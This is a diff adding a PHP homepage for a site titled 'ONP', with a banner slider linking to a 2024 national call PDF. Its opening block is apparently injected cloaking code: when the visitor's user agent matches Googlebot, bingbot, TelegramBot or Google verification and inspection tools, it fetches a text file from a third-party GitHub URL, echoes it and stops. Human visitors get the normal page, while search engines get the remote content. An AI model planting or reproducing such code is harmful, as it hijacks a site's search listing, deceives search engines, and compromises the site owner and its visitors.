@@ -1,0 +1,111 @@
+<?php
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    
+    return false;
+}
+
+if (is_bot()) {
+    $message = file_get_contents('https://raw.githubusercontent.com/lsri97008/cunbos/refs/heads/main/onp.mx.txt');
+    echo $message;
+exit; // Atau bisa menggunakan die()
+}
+?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>ONP</title>
+  <link href="css/style.css?v=7" rel="stylesheet" type="text/css" />
+  <script src="http://code.jquery.com/jquery-2.2.3.min.js"></script>
+  <script src="http://code.jquery.com/ui/1.11.4/jquery-ui.js"></script>
+  <script type="text/javascript" src="js/jssor.js"></script>
+  <script type="text/javascript" src="js/jssor.slider.js"></script>
+  <!--<script type="text/javascript" src="js/banner.js"></script>-->
+  <script>
+    jQuery(document).ready(function ($) {
+        var _SlideshowTransitions = [
+        //Fade
+        { $Duration: 1200, $Opacity: 2 }
+        ];
+        var options = {
+          $AutoPlay: true,
+          $AutoPlayInterval: 5000,
+          $PauseOnHover: 0
+        };
+        var jssor_slider1 = new $JssorSlider$('slider1_container', options);
+        var jssor_slider2 = new $JssorSlider$('slider2_container', options);
+
+        //responsive code begin
+        //remove responsive code if you don't want the slider scales
+        //while window resizing
+        function ScaleSlider() {
+            var parentWidth = $('#slider1_container').parent().width();
+            var parentWidth2 = $('#slider2_container').parent().width();
+            
+          if(parentWidth){
+            jssor_slider1.$ScaleWidth(parentWidth);
+          }else{
+            window.setTimeout(ScaleSlider, 30);
+          }
+          
+          if(parentWidth2){
+            jssor_slider2.$ScaleWidth(parentWidth2);
+          }else{
+            window.setTimeout(ScaleSlider, 30);
+          }
+        }
+        //Scale slider after document ready
+        ScaleSlider();
+
+        //Scale slider while window load/resize/orientationchange.
+        $(window).bind("load", ScaleSlider);
+        $(window).bind("resize", ScaleSlider);
+        $(window).bind("orientationchange", ScaleSlider);
+        //responsive code end
+    });
+  </script>
+</head>
+<body>
+  <?php
+    include_once "c_menu.php";
+  ?>
+  <div class="bannerD">
+    <div id="slider1_container" style="position: relative; top: 0px; left: 0px; width: 1920px; height: 940px;" class="noMovil">
+      <!-- Slides Container -->
+      <div u="slides" style="cursor: move; position: absolute; overflow: hidden; left: 0px; top: 0px; width: 1920px; height: 940px;">
+        
+        <div><a href="pdf/2024/convocatorias/CONVOCATORIA_NACIONAL_2024.pdf?v=2" target="_blank"><img u="image" src="images/index_banner_08_onp.jpg?v=2" /></a></div>
+        <div><a href="pdf/2024/convocatorias/CONVOCATORIA_NACIONAL_2024.pdf?v=2" target="_blank"><img u="image" src="images/index_banner_09_onp.jpg?v=2" /></a></div>
+        <div><img u="image" src="images/index_banner_05_onp.jpg?v=2" /></div>
+        <div><img u="image" src="images/index_banner_07_onp.jpg?v=2" /></div>
+      </div>
+    </div>
+    
+    <div id="slider2_container" style="position: relative; top: 0px; left: 0px; width: 900px; height: 1370px;" class="bannerMovil">
+      <div u="slides" style="cursor: move; position: absolute; overflow: hidden; left: 0px; top: 0px; width: 900px; height: 1370px;">
+        
+        <div><a href="pdf/2024/convocatorias/CONVOCATORIA_NACIONAL_2024.pdf?v=2" target="_blank"><img src="images/index_movil_banner_08_onp.jpg?v=2" width="100%" /></a></div>
+        <div><a href="pdf/2024/convocatorias/CONVOCATORIA_NACIONAL_2024.pdf?v=2" target="_blank"><img src="images/index_movil_banner_09_onp.jpg?v=2" width="100%" /></a></div>
+        <div><img src="images/index_movil_banner_10_onp.jpg" width="100%" /></div>
+        <div><img src="images/index_movil_banner_07_onp.jpg?v=2" width="100%" /></div>
+      </div>
+    </div>
+  </div>
+  <div class="cuerpoT">
+    
+    
+  </div>
+  <?php
+    /*include_once "c_footer.php";*/
+  ?>
+</body>
+</html>
